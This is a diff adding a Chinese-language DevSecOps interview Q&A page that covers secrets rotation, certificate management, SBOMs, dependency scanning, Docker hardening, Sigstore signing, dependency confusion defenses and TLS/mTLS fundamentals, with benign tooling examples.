+<li><strong>全 AWS 环境 + Serverless</strong> → AWS Secrets Manager + Parameter Store</li>
+<li><strong>单体应用&#x2F;初创团队</strong> → 环境变量 + SOPS</li>
+</ul>
+<p><strong>深入思考</strong></p>
+<ul>
+<li><strong>Vault 的运维成本</strong>：Vault 需要高可用集群、存储后端（Consul&#x2F;Raft）、自动解封、备份。对团队运营能力要求高。小团队直接上 Vault 可能适得其反。</li>
+<li><strong>信封加密（Envelope Encryption）</strong>：KMS 每次加密操作有 4KB 的 Payload 限制，且 API 调用有成本。信封加密模式：使用 KMS 加密 DEK（Data Encryption Key），再用 DEK 加密实际数据。DEK 缓存在本地，减少 KMS API 调用。</li>
+<li><strong>不可变基础设施中的密钥管理</strong>：容器&#x2F;Pod 启动时从 Vault 拉取密钥，不在镜像中保存任何密钥。使用 Sidecar 模式或 Init Container。</li>
+</ul>
+<p><strong>参考链接</strong></p>
+<ul>
+<li><a target="_blank" rel="noopener" href="https://www.vaultproject.io/">https://www.vaultproject.io/</a></li>
+<li>AWS KMS Developer Guide</li>
+<li>Mozilla SOPS: <a target="_blank" rel="noopener" href="https://github.com/getsops/sops">https://github.com/getsops/sops</a></li>
+</ul>
+<h3 id="Q24：Secrets-轮换策略与实践"><a href="#Q24：Secrets-轮换策略与实践" class="headerlink" title="Q24：Secrets 轮换策略与实践"></a>Q24：Secrets 轮换策略与实践</h3><p><strong>标准答案</strong></p>
+<p><strong>轮换的核心原则</strong>：将 secrets 的生命周期缩短到”泄露无害”的程度。</p>
+<p><strong>轮换策略：</strong></p>
+<ol>
+<li><p><strong>静态密钥轮换</strong>（数据库密码、API Key）：</p>
+<ul>
+<li><strong>手动轮换</strong>：更新 → 重启服务</li>
+<li><strong>双密钥模式</strong>：新旧密钥同时有效，确保切换过程无中断</li>
+</ul>
+<figure class="highlight yaml"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment"># 双密钥部署模式</span></span><br><span class="line"><span class="comment"># 阶段1：部署新密钥，旧密钥继续有效</span></span><br><span class="line"><span class="attr">secrets:</span></span><br><span class="line">  <span class="attr">db_password_new:</span> <span class="string">&quot;new_password&quot;</span></span><br><span class="line">  <span class="attr">db_password_old:</span> <span class="string">&quot;old_password&quot;</span>  <span class="comment"># 过渡期保留</span></span><br><span class="line"></span><br><span class="line"><span class="comment"># 阶段2：所有服务切换后，移除旧密钥</span></span><br><span class="line"><span class="attr">secrets:</span></span><br><span class="line">  <span class="attr">db_password:</span> <span class="string">&quot;new_password&quot;</span></span><br></pre></td></tr></table></figure>
+</li>
+<li><p><strong>动态密钥轮换</strong>（Vault 类型）：</p>
+<ul>
+<li>每次请求获取临时凭据</li>
+<li>TTL 到期后自动失效</li>
+<li>不需要手动轮换——天生轮换</li>
+</ul>
+</li>
+<li><p><strong>自动轮换</strong>（AWS Secrets Manager）：</p>
+<ul>
+<li>配置 Lambda 函数实现自动轮换</li>
+<li>支持 RDS 等数据库密码的自动化轮换</li>
+</ul>
+</li>
+</ol>
+<p><strong>轮换策略检查清单：</strong></p>
+<ul>
+<li><input disabled="" type="checkbox"> 读取 secrets 是否需要重启&#x2F;重新部署？</li>
+<li><input disabled="" type="checkbox"> 是否支持双密钥并行有效？</li>
+<li><input disabled="" type="checkbox"> 是否有回滚机制（旧密钥在新密钥出问题时能用）？</li>
+<li><input disabled="" type="checkbox"> 审计日志是否记录了每次轮换？</li>
+<li><input disabled="" type="checkbox"> 紧急轮换流程（泄露发生时，5 分钟内完成）是否就绪？</li>
+</ul>
+<p><strong>深入思考</strong></p>
+<ul>
+<li><strong>轮换频率</strong>：传统建议是 90 天。但在现代零信任模型下，推荐使用<strong>动态&#x2F;短期凭据</strong>来代替轮换（如 Vault 动态数据库密码、STS 临时凭证）。</li>
+<li><strong>手动轮换的风险</strong>：很多系统轮换流程全靠运维文档，没有自动化。当真正需要轮换时（泄露事件），手动操作容易出错。<strong>没有自动化的轮换等于没有轮换。</strong></li>
+<li><strong>Git 历史中的 Secrets</strong>：如果曾经有密钥被提交到 Git，即使删除和 .gitignore 也没用，密钥已经暴露。使用 <code>git filter-branch</code> 或 BFG Repo-Cleaner 从头清理，并吊销该密钥。</li>
+</ul>
+<p><strong>参考链接</strong></p>
+<ul>
+<li>NIST SP 800-57 (Key Management)</li>
+<li>AWS 秘密轮换指南</li>
+<li>HashiCorp Vault 动态 Secrets</li>
+</ul>
+<h3 id="Q25：-env-安全和证书管理"><a href="#Q25：-env-安全和证书管理" class="headerlink" title="Q25：.env 安全和证书管理"></a>Q25：.env 安全和证书管理</h3><p><strong>标准答案</strong></p>
+<p><strong>.env 文件安全规范：</strong></p>
+<ol>
+<li><strong>永不提交 Git</strong>：.env 在 <code>.gitignore</code> 中，使用 <code>.env.example</code> 作为模板提交</li>
+<li><strong>加密存储</strong>：敏感值使用 SOPS 或 git-crypt 加密</li>
+<li><strong>生产环境不使用 .env</strong>：生产环境用 Vault&#x2F;AWS Secrets Manager 替代 .env</li>
+<li><strong>审计</strong>：使用 <code>.env</code> diff 检查工具防止误提交</li>
+<li><strong>最低权限</strong>：每个环境使用独立的 .env，不共享生产密钥</li>
+</ol>
+<p><strong>证书管理：</strong></p>
+<ol>
+<li><p><strong>Let’s Encrypt + ACME 自动化</strong>：</p>
+<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment"># certbot 自动申请和续签</span></span><br><span class="line">certbot certonly --webroot -w /var/www/html -d example.com</span><br></pre></td></tr></table></figure>
+<ul>
+<li>90 天有效期，自动续签</li>
+<li>DNS-01 挑战支持通配符证书</li>
+</ul>
+</li>
+<li><p><strong>mTLS（双向 TLS）</strong>：服务间通信认证</p>
+<ul>
+<li>客户端和服务端都需出示证书</li>
+<li>部署方式：Sidecar（Envoy&#x2F;Istio）、应用层直接配置</li>
+<li><strong>生产最佳实践</strong>：证书轮换自动化（cert-manager + Vault PKI）</li>
+</ul>
+</li>
+<li><p><strong>证书固定（Certificate Pinning）</strong>：</p>
+<ul>
+<li><strong>优点</strong>：防止 CA 被攻陷后的中间人攻击</li>
+<li><strong>缺点</strong>：证书更换时需要更新客户端，容易引发大规模故障</li>
+<li><strong>建议</strong>：使用 <strong>HPKP 已废弃</strong>，推荐使用 <strong>Certificate Transparency</strong> 和 <strong>CAA Records</strong> 替代</li>
+<li><strong>移动端</strong>：对高频 API 做 SHA-256 公钥固定，配合备份&#x2F;备用证书</li>
+</ul>
+</li>
+</ol>
+<p><strong>深入思考</strong></p>
+<ul>
+<li><strong>cert-manager + Let’s Encrypt + Kubernetes</strong>：生产标准做法。cert-manager 自动管理 kubernetes.io&#x2F;tls secrets，支持 DNS-01 挑战（需要配置 DNS provider）。</li>
+<li><strong>CAA Record</strong>：DNS 层面限制哪些 CA 可以为你的域名签发证书。防止 CA 被攻陷后恶意签发你的证书。</li>
+<li><strong>证书过期事故</strong>：这是最常见的生产事故之一。必须有监控（<code>expiry_date &lt; 30 days</code>）和自动化续签。使用 <code>openssl s_client</code> 或 cert-manager 的状态监控。</li>
+</ul>
+<p><strong>参考链接</strong></p>
+<ul>
+<li>Let’s Encrypt: <a target="_blank" rel="noopener" href="https://letsencrypt.org/">https://letsencrypt.org/</a></li>
+<li>cert-manager: <a target="_blank" rel="noopener" href="https://cert-manager.io/">https://cert-manager.io/</a></li>
+<li>RFC 6844 - DNS CAA Resource Record</li>
+</ul>
+<hr>
+<h2 id="0x05-供应链安全"><a href="#0x05-供应链安全" class="headerlink" title="0x05 供应链安全"></a>0x05 供应链安全</h2><h3 id="Q26：SBOM（软件物料清单）与-CycloneDX-SPDX"><a href="#Q26：SBOM（软件物料清单）与-CycloneDX-SPDX" class="headerlink" title="Q26：SBOM（软件物料清单）与 CycloneDX &#x2F; SPDX"></a>Q26：SBOM（软件物料清单）与 CycloneDX &#x2F; SPDX</h3><p><strong>标准答案</strong></p>
+<p><strong>SBOM 定义</strong>：一份结构化的机器可读清单，列出软件制品中的所有组件、库和模块。</p>
+<p><strong>两大标准：</strong></p>
+<table>
+<thead>
+<tr>
+<th>维度</th>
+<th>SPDX (Software Package Data Exchange)</th>
+<th>CycloneDX (OWASP)</th>
+</tr>
+</thead>
+<tbody><tr>
+<td><strong>维护者</strong></td>
+<td>Linux Foundation</td>
+<td>OWASP</td>
+</tr>
+<tr>
+<td><strong>关注点</strong></td>
+<td>许可证合规、版权</td>
+<td>安全漏洞、依赖管理</td>
+</tr>
+<tr>
+<td><strong>格式</strong></td>
+<td>传统 RDF&#x2F;XML，逐步支持 JSON&#x2F;YAML</td>
+<td>原生 JSON&#x2F;XML</td>
+</tr>
+<tr>
+<td><strong>版本</strong></td>
+<td>3.0+ 改进了 JSON 支持</td>
+<td>成熟度高的 JSON 生态</td>
+</tr>
+<tr>
+<td><strong>场景</strong></td>
+<td>法律&#x2F;合规团队</td>
+<td>安全工程&#x2F;DevSecOps</td>
+</tr>
+</tbody></table>
+<p><strong>生产实践：</strong></p>
+<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment"># 使用 Syft 生成 SBOM（CycloneDX 格式）</span></span><br><span class="line">syft packages nginx:latest -o cyclonedx-json &gt; nginx-sbom.json</span><br><span class="line"></span><br><span class="line"><span class="comment"># 使用 Trivy 扫描 SBOM 漏洞</span></span><br><span class="line">trivy sbom nginx-sbom.json</span><br></pre></td></tr></table></figure>
+
+<p><strong>SBOM 的用途：</strong></p>
+<ul>
+<li>依赖漏洞扫描（配合 Trivy&#x2F;Grype）</li>
+<li>许可证合规审计</li>
+<li>组件溯源（某漏洞组件是否在制品中）</li>
+<li>供应链风险分析</li>
+</ul>
+<p><strong>深入思考</strong></p>
+<ul>
+<li><strong>SBOM 的核心价值</strong>：Log4Shell（CVE-2021-44228）事件后，SBOM 从”最佳实践”变成了”合规要求”。美国政府 EO 14028 明确要求联邦供应商提供 SBOM。</li>
+<li><strong>SBOM 不是银弹</strong>：SBOM 告诉你有什么组件，但不能修复它们。真正的供应链安全需要 SBOM + 漏洞扫描 + 自动修补流程。</li>
+<li><strong>操作层面建议</strong>：在 CI&#x2F;CD 构建过程中自动生成 SBOM，并将其作为 artifacts 存储和签名。</li>
+</ul>
+<p><strong>参考链接</strong></p>
+<ul>
+<li>SPDX: <a target="_blank" rel="noopener" href="https://spdx.dev/">https://spdx.dev/</a></li>
+<li>CycloneDX: <a target="_blank" rel="noopener" href="https://cyclonedx.org/">https://cyclonedx.org/</a></li>
+<li>EO 14028 - Improving the Nation’s Cybersecurity</li>
+</ul>
+<h3 id="Q27：依赖扫描（Dependabot-Snyk-Trivy）"><a href="#Q27：依赖扫描（Dependabot-Snyk-Trivy）" class="headerlink" title="Q27：依赖扫描（Dependabot &#x2F; Snyk &#x2F; Trivy）"></a>Q27：依赖扫描（Dependabot &#x2F; Snyk &#x2F; Trivy）</h3><p><strong>标准答案</strong></p>
+<table>
+<thead>
+<tr>
+<th>工具</th>
+<th>类型</th>
+<th>特点</th>
+<th>适用场景</th>
+</tr>
+</thead>
+<tbody><tr>
+<td><strong>Dependabot</strong></td>
+<td>GitHub 原生</td>
+<td>自动 PR、免费</td>
+<td>GitHub 项目，CI 无缝集成</td>
+</tr>
+<tr>
+<td><strong>Snyk</strong></td>
+<td>SaaS + CLI</td>
+<td>多语言、丰富修复建议</td>
+<td>企业级、多仓库管理</td>
+</tr>
+<tr>
+<td><strong>Trivy</strong></td>
+<td>开源 CLI</td>
+<td>镜像+依赖+SBOM 全扫</td>
+<td>容器安全、CI 流水线</td>
+</tr>
+<tr>
+<td><strong>Renovate</strong></td>
+<td>开源 Bot</td>
+<td>高度可配置、多平台</td>
+<td>批量依赖升级自动化</td>
+</tr>
+</tbody></table>
+<p><strong>生产工作流：</strong></p>
+<figure class="highlight yaml"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment"># GitHub Actions + Trivy</span></span><br><span class="line"><span class="bullet">-</span> <span class="attr">name:</span> <span class="string">Scan</span> <span class="string">dependencies</span></span><br><span class="line">  <span class="attr">uses:</span> <span class="string">aquasecurity/trivy-action@master</span></span><br><span class="line">  <span class="attr">with:</span></span><br><span class="line">    <span class="attr">scan-type:</span> <span class="string">&#x27;fs&#x27;</span></span><br><span class="line">    <span class="attr">scan-ref:</span> <span class="string">&#x27;.&#x27;</span></span><br><span class="line">    <span class="attr">format:</span> <span class="string">&#x27;sarif&#x27;</span></span><br><span class="line">    <span class="attr">output:</span> <span class="string">&#x27;trivy-results.sarif&#x27;</span></span><br><span class="line">    <span class="attr">severity:</span> <span class="string">&#x27;CRITICAL,HIGH&#x27;</span></span><br></pre></td></tr></table></figure>
+
+<p><strong>最佳实践：</strong></p>
+<ul>
+<li><strong>分层扫描</strong>：开发阶段（IDE 插件）→ CI 阶段（自动阻止高危漏洞）→ 生产部署前（强制门禁）</li>
+<li><strong>自动修复</strong>：Dependabot 开的 PR 需要有自动合并流程（补丁版本自动合，次要&#x2F;主要版本人工审核）</li>
+<li><strong>容忍度策略</strong>：<ul>
+<li>Critical + High：必须修复，阻断发布</li>
+<li>Medium：指定修复时间窗口（如 14 天）</li>
+<li>Low：纳入下次维护窗口</li>
+</ul>
+</li>
+<li><strong>避免 false-positive 疲劳</strong>：配置漏洞忽略列表，定期审查和清理</li>
+</ul>
+<p><strong>深入思考</strong></p>
+<ul>
+<li><strong>依赖扫描的深度</strong>：只扫描直系依赖远远不够。1 个直接依赖可能引入 100 个传递依赖。Trivy 和 Snyk 支持深度扫描传递依赖。</li>
+<li><strong>零日漏洞响应</strong>：依赖扫描是已知漏洞的防御，对零日攻击（零时差攻击）无能为力。需要配合 SBOM 快速定位受影响组件。</li>
+<li><strong>License 扫描</strong>：Synk&#x2F;Trivy 不仅扫安全漏洞，也扫描许可证合规（GPL 是否污染商业代码）。</li>
+</ul>
+<p><strong>参考链接</strong></p>
+<ul>
+<li><a target="_blank" rel="noopener" href="https://trivy.dev/">https://trivy.dev/</a></li>
+<li><a target="_blank" rel="noopener" href="https://snyk.io/">https://snyk.io/</a></li>
+<li><a target="_blank" rel="noopener" href="https://docs.github.com/en/code-security/dependabot">https://docs.github.com/en/code-security/dependabot</a></li>
+</ul>
+<h3 id="Q28：Docker-镜像安全"><a href="#Q28：Docker-镜像安全" class="headerlink" title="Q28：Docker 镜像安全"></a>Q28：Docker 镜像安全</h3><p><strong>标准答案</strong></p>
+<p><strong>四大原则：</strong></p>
+<ol>
+<li><p><strong>最小基础镜像</strong>：</p>
+<figure class="highlight dockerfile"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment"># ❌ 危险：包含编译工具、Shell、各类包管理器</span></span><br><span class="line"><span class="keyword">FROM</span> ubuntu:<span class="number">22.04</span></span><br><span class="line"></span><br><span class="line"><span class="comment"># ✅ 安全：仅包含运行所需的最小内容</span></span><br><span class="line"><span class="keyword">FROM</span> alpine:<span class="number">3.19</span>          <span class="comment"># 5MB</span></span><br><span class="line"><span class="comment"># 或</span></span><br><span class="line"><span class="keyword">FROM</span> gcr.io/distroless/base-debian12  <span class="comment"># 无 shell 和包管理器</span></span><br><span class="line"><span class="comment"># 或</span></span><br><span class="line"><span class="keyword">FROM</span> scratch              <span class="comment"># 空镜像，适合静态编译的 Go 应用</span></span><br></pre></td></tr></table></figure>
+<ul>
+<li>镜像越小，攻击面越小</li>
+<li>Distroless 镜像不含 shell 和 apt，无法执行任意命令</li>
+</ul>
+</li>
+<li><p><strong>多阶段构建</strong>：</p>
+<figure class="highlight dockerfile"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment"># Stage 1: Build</span></span><br><span class="line"><span class="keyword">FROM</span> golang:<span class="number">1.22</span> AS builder</span><br><span class="line"><span class="keyword">COPY</span><span class="language-bash"> . /app</span></span><br><span class="line"><span class="keyword">RUN</span><span class="language-bash"> CGO_ENABLED=0 go build -o /app/server</span></span><br><span class="line"></span><br><span class="line"><span class="comment"># Stage 2: Runtime（最小镜像）</span></span><br><span class="line"><span class="keyword">FROM</span> gcr.io/distroless/base-debian12</span><br><span class="line"><span class="keyword">COPY</span><span class="language-bash"> --from=builder /app/server /server</span></span><br><span class="line"><span class="keyword">EXPOSE</span> <span class="number">8080</span></span><br><span class="line"><span class="keyword">USER</span> nonroot</span><br><span class="line"><span class="keyword">CMD</span><span class="language-bash"> [<span class="string">&quot;/server&quot;</span>]</span></span><br></pre></td></tr></table></figure>
+<ul>
+<li>构建阶段使用完整工具链</li>
+<li>运行阶段只拷贝编译产物，不含编译器、依赖等</li>
+</ul>
+</li>
+<li><p><strong>非 root 运行</strong>：</p>
+<figure class="highlight dockerfile"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">RUN</span><span class="language-bash"> groupadd --system appgroup &amp;&amp; \</span></span><br><span class="line"><span class="language-bash">    useradd --system --gid appgroup --create-home appuser</span></span><br><span class="line"><span class="keyword">USER</span> appuser</span><br></pre></td></tr></table></figure>
+<ul>
+<li>默认容器以 root 运行，容器逃逸后 root 权限直达宿主机</li>
+<li>始终创建专用用户运行应用</li>
+<li>限制容器 capability（<code>--cap-drop=ALL --cap-add=NET_BIND_SERVICE</code>）</li>
+</ul>
+</li>
+<li><p><strong>镜像签名与扫描</strong>：</p>
+<ul>
+<li>使用 Cosign 签名镜像，确保完整性</li>
+<li>CI 中集成 Trivy&#x2F;Grype 扫描镜像漏洞</li>
+<li>使用 OPA 策略阻止高危漏洞镜像部署</li>
+</ul>
+</li>
+</ol>
+<p><strong>深入思考</strong></p>
+<ul>
+<li><strong>Distroless 的问题</strong>：没有 shell 和调试工具，生产排错困难。折中方案：使用 Alpine（带 shell 但更小），或准备调试用 Sidecar 容器。</li>
+<li><strong>Rootless Container</strong>：Docker 和 Podman 支持 rootless 模式，容器进程以非 root 用户运行，进一步降低了容器逃逸风险。</li>
+<li><strong>Base Image 版本追踪</strong>：不要用 <code>:latest</code>，始终锁定具体版本（<code>alpine:3.19.1</code>），并用 renovate&#x2F;dependabot 管理更新。</li>
+</ul>
+<p><strong>参考链接</strong></p>
+<ul>
+<li>Docker 安全最佳实践</li>
+<li><a target="_blank" rel="noopener" href="https://docs.docker.com/build/building/best-practices/">https://docs.docker.com/build/building/best-practices/</a></li>
+<li>Google Distroless: <a target="_blank" rel="noopener" href="https://github.com/GoogleContainerTools/distroless">https://github.com/GoogleContainerTools/distroless</a></li>
+</ul>
+<h3 id="Q29：软件签名（Sigstore-Cosign）和-Dependency-Confusion"><a href="#Q29：软件签名（Sigstore-Cosign）和-Dependency-Confusion" class="headerlink" title="Q29：软件签名（Sigstore &#x2F; Cosign）和 Dependency Confusion"></a>Q29：软件签名（Sigstore &#x2F; Cosign）和 Dependency Confusion</h3><p><strong>标准答案</strong></p>
+<p><strong>Sigstore 生态：</strong><br>Sigstore 是一套开源工具，用于签名、验证和保护软件供应链：</p>
+<ul>
+<li><strong>Cosign</strong>：容器镜像和制品的签名工具</li>
+<li><strong>Fulcio</strong>：代码签名的 CA（证书颁发机构），基于 OIDC 签发短期证书</li>
+<li><strong>Rekor</strong>：透明度日志，记录所有签名事件</li>
+</ul>
+<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment"># 使用 Cosign 签名镜像</span></span><br><span class="line">cosign sign --key cosign.key ghcr.io/myorg/myapp:latest</span><br><span class="line"></span><br><span class="line"><span class="comment"># 验证镜像签名</span></span><br><span class="line">cosign verify --key cosign.pub ghcr.io/myorg/myapp:latest</span><br><span class="line"></span><br><span class="line"><span class="comment"># 使用 Keyless（基于 OIDC 身份）</span></span><br><span class="line">cosign sign ghcr.io/myorg/myapp:latest  <span class="comment"># 自动使用 GitHub/GitLab 身份</span></span><br></pre></td></tr></table></figure>
+
+<p><strong>Dependency Confusion 攻击：</strong></p>
+<p>攻击原理：企业在使用私有包时，如果私有包名与公共注册表（npm&#x2F;PyPI）中的包名冲突，包管理器可能误将公共包的恶意版本拉入项目。</p>
+<figure class="highlight json"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">// package.json 中的依赖</span></span><br><span class="line"><span class="punctuation">&#123;</span></span><br><span class="line">  <span class="attr">&quot;dependencies&quot;</span><span class="punctuation">:</span> <span class="punctuation">&#123;</span></span><br><span class="line">    <span class="attr">&quot;@mycompany/internal-auth&quot;</span><span class="punctuation">:</span> <span class="string">&quot;^1.0.0&quot;</span><span class="punctuation">,</span>  <span class="comment">// 私有注册表</span></span><br><span class="line">    <span class="attr">&quot;internal-auth&quot;</span><span class="punctuation">:</span> <span class="string">&quot;^1.0.0&quot;</span>              <span class="comment">// ❌ 同名包可能在 npm 上存在恶意版本！</span></span><br><span class="line">  <span class="punctuation">&#125;</span></span><br><span class="line"><span class="punctuation">&#125;</span></span><br></pre></td></tr></table></figure>
+
+<p><strong>防御措施：</strong></p>
+<ol>
+<li><strong>命名空间隔离</strong>：使用 <code>@scope</code>（npm）、<code>__</code>（Python）区分私有包</li>
+<li><strong>注册表优先级明确</strong>：npm 使用 <code>--registry</code> 指定私服，或配置 <code>npmrc</code> 仅从私服安装</li>
+<li><strong>Dependency Confusion 扫描</strong>：使用工具扫描你的依赖名是否在公共注册表中存在</li>
+<li><strong>锁文件（lockfile）</strong>：锁定依赖版本，避免被恶意”新版本”替代</li>
+<li><strong>私有注册表鉴权</strong>：确保私有注册表需要认证，防止外部访问</li>
+</ol>
+<p><strong>深入思考</strong></p>
+<ul>
+<li><strong>Keyless Signing 的革新</strong>：传统的软件签名依赖”信任根”（密钥），密钥管理成问题。Sigstore 的 Keyless 模式用 OIDC 身份（GitHub&#x2F;GitLab&#x2F;Google）绑定签名，不需要传统的长生命周期密钥，这是供应链安全的重大进步。</li>
+<li><strong>Dependency Confusion 真实案例</strong>：2022 年多家大公司受到攻击，攻击者在 npm&#x2F;PyPI 上传了企业私有包的同名版本。</li>
+<li><strong>包管理器配置检查清单</strong>：<ul>
+<li><input disabled="" type="checkbox"> 是否有 <code>.npmrc</code> 配置了私有源？</li>
+<li><input disabled="" type="checkbox"> lockfile 是否提交到 Git？</li>
+<li><input disabled="" type="checkbox"> CI 安装依赖时是否使用了正确的源？</li>
+<li><input disabled="" type="checkbox"> 是否扫描了 public registry 上的同包名冲突？</li>
+</ul>
+</li>
+</ul>
+<p><strong>参考链接</strong></p>
+<ul>
+<li>Sigstore: <a target="_blank" rel="noopener" href="https://www.sigstore.dev/">https://www.sigstore.dev/</a></li>
+<li>Cosign: <a target="_blank" rel="noopener" href="https://github.com/sigstore/cosign">https://github.com/sigstore/cosign</a></li>
+<li>“Dependency Confusion: How I Hacked Into Apple, Microsoft” (Alex Birsan)</li>
+</ul>
+<hr>
+<h2 id="0x06-网络与基础设施安全"><a href="#0x06-网络与基础设施安全" class="headerlink" title="0x06 网络与基础设施安全"></a>0x06 网络与基础设施安全</h2><h3 id="Q30：TLS-mTLS-原理"><a href="#Q30：TLS-mTLS-原理" class="headerlink" title="Q30：TLS &#x2F; mTLS 原理"></a>Q30：TLS &#x2F; mTLS 原理</h3><p><strong>标准答案</strong></p>
+<p><strong>TLS 握手（1.3 简化版）：</strong></p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">Client                            Server</span><br><span class="line">  |--- ClientHello (TLS版本, 密码套件, key_share) --&gt;|</span><br><span class="line">  |&lt;-- ServerHello (密码套件, key_share), 证书, CertVerify --|</span><br><span class="line">  |--- Finished (加密握手消息验证) ------------------&gt;|</span><br><span class="line">  |&lt;-- Finished -------------------------------------|</span><br><span class="line">  |=== 加密通信开始 =====================================|</span><br></pre></td></tr></table></figure>
+
+<ol>
+<li><strong>ClientHello</strong>：客户端发送支持的 TLS 版本、密码套件列表、DH key_share</li>
+<li><strong>ServerHello</strong>：服务端选定参数、发送证书链（含公钥）、DH key_share 和服务端签名</li>
+<li><strong>证书验证</strong>：客户端验证服务端证书链（信任锚 → 中间 CA → 服务端证书）</li>
+<li><strong>密钥协商</strong>：ECDHE 密钥交换（前向安全性），生成会话密钥</li>
+<li><strong>Finished</strong>：确认握手消息未被篡改</li>
+</ol>
+<p><strong>mTLS（双向 TLS）</strong>：在一端验证之外，客户端也出示证书。</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">Client                            Server</span><br><span class="line">  |--- ClientHello -------------------------------&gt;|</span><br><span class="line">  |&lt;--- ServerHello, 证书, CertificateRequest -----|</span><br><span class="line">  |--- 客户端证书, ClientCertVerify, Finished ----&gt;|</span><br><span class="line">  |&lt;--- Finished ----------------------------------|</span><br></pre></td></tr></table></figure>
+
+<ul>
+<li>服务端在握手时发送 <code>CertificateRequest</code></li>
+<li>客户端发送自己的证书和签名证明</li>
+</ul>
+<p><strong>核心概念：</strong></p>
+<ul>
+<li><strong>证书链（Certificate Chain）</strong>：根 CA → 中间 CA → 服务器证书</li>
+<li><strong>密码套件（Cipher Suite）</strong>：<ul>
+<li>TLS 1.2：<code>TLS_ECDHE_RSA_WITH_AES_256_GCM_SHA384</code></li>
+<li>TLS 1.3：简化，握手时协商 AEAD + HKDF</li>
+</ul>
+</li>
+<li><strong>前向安全性（PFS）</strong>：ECDHE 密钥交换确保即使私钥泄露，过去的会话也无法解密</li>
+</ul>
+<p><strong>深入思考</strong></p>
+<ul>
+<li><strong>TLS 1.2 vs 1.3</strong>：1.3 将握手从 2-RTT 降到 1-RTT（和 0-RTT 会话恢复），移除了不安全算法（RC4、3DES、CBC-mode）。2025 年应完全禁用 1.0&#x2F;1.1。TLS 1.2 作为兼容降级选项保留，但推荐只使用 1.3。</li>
+<li><strong>mTLS 的部署位置</strong>：在 Sidecar 模式（Envoy&#x2F;Istio&#x2F;Linkerd）中，服务间 mTLS 在 Sidecar 层处理，应用代码无感知。也可以直接在应用层实现（gRPC 原生支持 mTLS）。</li>
+<li><strong>证书轮换的挑战</strong>：mTLS 在微服务规模下（几千个服务实例），证书轮换必须自动化。cert-manager 和 SPIFFE&#x2F;SPIRE 生态解决了这个问题。</li>
+</ul>
+<p><strong>参考链接</strong></p>
+<ul>
+<li>RFC 8446 - TLS 1.3</li>
+<li>Cloudflare TLS 1.3 Explained</li>
+<li>CNCF SPIFFE&#x2F;SPIRE: <a target="_blank" rel="noopener" href="https://spiffe.io/">https://spiffe.io/</a></li>
+</ul>
+<h3 id="Q31：HTTPS-证书验证过程"><a href="#Q31：HTTPS-证书验证过程" class="headerlink" title="Q31：HTTPS 证书验证过程"></a>Q31：HTTPS 证书验证过程</h3><p><strong>标准答案</strong></p>
+<p>当浏览器访问 HTTPS 网站时，证书验证从 TLS 握手开始：</p>
+<ol>
+<li><strong>证书下载</strong>：服务端在 TLS 握手中发送证书链（服务器证书 + 中间 CA 证书）</li>
+<li><strong>证书链校验</strong>：<ul>
+<li>验证每个证书的签名（父 CA 签子证书）</li>
+<li>验证信任锚（根证书）在浏览器的受信任 CA 列表中</li>
+<li>（浏览器预装约 100-150 个根证书）</li>
+</ul>
+</li>
+<li><strong>域名校验</strong>：检查证书的 <code>CN</code> 或 <code>SAN</code>（Subject Alternative Name）是否匹配访问的域名</li>
+<li><strong>有效期检查</strong>：验证当前时间在 <code>notBefore</code> 和 <code>notAfter</code> 之间</li>
+<li><strong>吊销检查</strong>：<ul>
+<li><strong>OCSP（Online Certificate Status Protocol）</strong>：实时查询证书状态（但可能被阻断）</li>
+<li><strong>OCSP Stapling</strong>：服务端预先获取 OCSP 响应，在 TLS 握手时一并发送（更好）</li>
+<li><strong>CRL（Certificate Revocation List）</strong>：下载证书吊销列表（不常用，过大）</li>
+</ul>
+</li>
+<li><strong>Certificate Transparency</strong>：检查证书是否已记录在公共日志中（SCT 扩展）</li>
+</ol>
+<p><strong>深入思考</strong></p>
+<ul>
+<li><strong>CA 被攻陷怎么办？</strong> Certificate Transparency 就是为了解决这个问题而设计的。所有公开 CA 签发的证书都必须记录到 CT 日志。域名所有者可以监控是否有未经授权的证书签发（通过 CAA 记录限制允许的 CA）。</li>
